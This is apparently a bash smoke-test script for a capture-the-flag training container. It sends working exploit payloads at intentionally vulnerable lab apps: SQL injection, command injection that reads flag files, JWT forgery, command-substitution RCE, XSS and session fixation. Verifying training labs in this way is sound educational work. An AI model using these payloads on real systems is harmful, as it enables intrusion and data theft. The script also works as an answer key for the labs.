#!/usr/bin/env bash
# Smoke-test the COMBINED lab-in-a-box container: fires the working exploit at the
# full app (Track A, at /) AND every warm-up (Track B, at /labNN/) through one port,
# asserting the right flag comes back. Also checks the ttyd terminal answers.
#
#   BASE=http://localhost:8080 bash verify.sh
set -u
BASE="${BASE:-http://localhost:8080}"
TERM_URL="${TERM_URL:-http://localhost:7681/term/}"
JAR=$(mktemp)
PASS=0; FAIL=0
ok(){  printf '  \033[32m[+] PASS\033[0m %s\n' "$1"; PASS=$((PASS+1)); }
bad(){ printf '  \033[31m[-] FAIL\033[0m %s\n' "$1"; FAIL=$((FAIL+1)); }
hd(){  printf '\n\033[36m== %s ==\033[0m\n' "$1"; }
b64(){    printf '%s' "$1" | base64 | tr -d '\n'; }
b64u(){   printf '%s' "$1" | base64 | tr '+/' '-_' | tr -d '=\n'; }
# Match a flag CONTAINING the wanted token. (Must be token-scoped: the lab pages
# embed a CSS rule `.flag{color:...}` that a bare flag{...} regex matches first.)
hasflag(){  grep -q  "flag{[^}]*${1}[^}]*}" <<<"$2"; }
showflag(){ grep -o  "flag{[^}]*${1}[^}]*}" <<<"$2" | head -1; }
# check <label> <token> <body>
chk(){ if hasflag "$2" "$3"; then ok "$1 -> $(showflag "$2" "$3")"; else bad "$1"; fi; }

# wait for the app
for i in $(seq 1 60); do curl -fsS "$BASE/" >/dev/null 2>&1 && break; sleep 1; done
curl -s -c "$JAR" -b "$JAR" "$BASE/app/login.php" --data 'username=student&password=hunter2' >/dev/null

hd "FULL APP (Track A) — through /"
b=$(curl -s -o /dev/null -w '%{http_code}' -b "$JAR" "$BASE/app/export.php?id=5"); [ "$b" = 403 ] && ok "Ch1 IDOR decoy id -> 403" || bad "Ch1 decoy (got $b)"
b=$(curl -s -b "$JAR" "$BASE/app/export.php?ref=BH-7C23"); chk "Ch1 IDOR ref leak" 'id0r' "$b"
b=$(curl -s "$BASE/sqli/" --data-urlencode "login=' OR 1=1 -- -" --data 'password=x'); chk "Ch2 login SQLi" 'sql1_l0gin' "$b"
b=$(curl -s -b "$JAR" --get "$BASE/app/search.php" --data-urlencode "owner=' OR '1'='1"); chk "Ch3 search SQLi" 'sql1_s3arch' "$b"
b=$(curl -s -G "$BASE/cmdi/" --data-urlencode 'host=8.8.8.8" | cat /opt/flags/cmdi.txt #'); chk "Ch4 cmd injection" 'cmd1' "$b"
H=$(b64u '{"alg":"none"}'); P=$(b64u '{"sub":1,"username":"x","role":"admin"}')
b=$(curl -s "$BASE/app/api/me.php" -H "Authorization: Bearer $H.$P."); chk "Ch5 JWT alg:none" 'jwt' "$b"
UN=$(b64 "' UNION/**/SELECT 1,2,'admin',4-- -")
r=$(curl -s "$BASE/app/api/token.php" --data-urlencode "auth=$UN"); grep -q '"role": *"admin"' <<<"$r" && ok "Ch6 UNION SQLi forges admin token" || bad "Ch6 UNION ($r)"
ADMTOK=$(sed -n 's/.*"token": *"\([^"]*\)".*/\1/p' <<<"$r")
t0=$(date +%s); curl -s "$BASE/app/api/restore.php" -H "Authorization: Bearer $ADMTOK" -H 'Content-Type: application/json' --data '{"target":"$(sleep${IFS}3)#"}' >/dev/null; dt=$(( $(date +%s) - t0 ))
[ "$dt" -ge 3 ] && ok "Ch7 RCE command-substitution executes (delay ${dt}s)" || bad "Ch7 RCE timing (${dt}s)"
curl -s -b "$JAR" "$BASE/app/profile.php" --data-urlencode 'display_name="><details open ontoggle=alert(1)>' >/dev/null
grep -q 'ontoggle=alert(1)' <<<"$(curl -s -b "$JAR" "$BASE/app/profile.php")" && ok "Ch9 stored XSS reflects unescaped" || bad "Ch9 stored XSS"
curl -s -b "$JAR" "$BASE/app/profile.php" --data-urlencode 'display_name=student' >/dev/null
SID=$(curl -s -i "$BASE/app/login.php" | tr -d '\r' | sed -n 's/.*bh_sid=\(s_[0-9a-f]\{32\}\).*/\1/p' | head -1)
curl -s -b "bh_sid=$SID" "$BASE/app/login.php" --data 'username=student&password=hunter2' >/dev/null
grep -q 'student@udb' <<<"$(curl -s -b "bh_sid=$SID" "$BASE/app/")" && ok "Ch10 session fixation (planted SID authenticated)" || bad "Ch10 session fixation"

hd "WARM-UP LABS (Track B) — through /labNN/"
b=$(curl -s "$BASE/lab00/?id=1001"); chk "lab00 IDOR (plain int)" 'indiv_id0r_1nt' "$b"
b=$(curl -s "$BASE/lab01/?doc=MTAwMQ=="); chk "lab01 IDOR" 'indiv_id0r' "$b"
b=$(curl -s "$BASE/lab02/" --data-urlencode "user=' OR 'a'='a" --data-urlencode "pin=' OR 'a'='a"); chk "lab02 SQLi login" 'indiv_sql1' "$b"
b=$(curl -s -G "$BASE/lab03/" --data-urlencode "q=' UNION SELECT username, secret FROM users-- "); chk "lab03 SQLi UNION" 'indiv_uni0n' "$b"
b=$(curl -s -G "$BASE/lab04/" --data-urlencode "domain=example.com; cat flag.txt"); chk "lab04 cmd injection" 'indiv_cmd1' "$b"
H=$(b64u '{"alg":"HS256","typ":"JWT"}'); P=$(b64u '{"user":"viewer","is_admin":true}')
b=$(curl -s "$BASE/lab05/" --data-urlencode "token=$H.$P.x"); chk "lab05 JWT no-verify" 'indiv_jwt' "$b"
PAY="' UNION SELECT 'a',(SELECT flag FROM vault),'b'-- "; HEX=$(printf '%s' "$PAY" | xxd -p | tr -d '\n')
b=$(curl -s "$BASE/lab06/?t=$HEX"); chk "lab06 whitebox SQLi" 'indiv_wh1tebox_h3x' "$b"
b=$(curl -s -G "$BASE/lab07/" --data-urlencode "name=x'; cat flag.txt; echo '"); chk "lab07 whitebox RCE (flag.txt in cwd)" 'indiv_wh1tebox_rce' "$b"
b=$(curl -s -G "$BASE/lab09/" --data-urlencode 'q=<img src=x onerror=alert(1)>'); grep -q '<img src=x onerror=alert(1)>' <<<"$b" && ok "lab09 reflected XSS (payload unescaped)" || bad "lab09"

hd "TERMINAL"
code=$(curl -s -o /dev/null -w '%{http_code}' "$TERM_URL"); { [ "$code" = 200 ] || [ "$code" = 301 ] || [ "$code" = 302 ]; } && ok "ttyd browser terminal answers (HTTP $code)" || bad "ttyd terminal (got $code)"

hd "RESULT"; printf 'PASS=%d  FAIL=%d\n' "$PASS" "$FAIL"
rm -f "$JAR"
[ "$FAIL" -eq 0 ] && { echo "ALL COMBINED-CONTAINER CHECKS PASSED."; exit 0; } || { echo "Some checks failed — see above."; exit 1; }
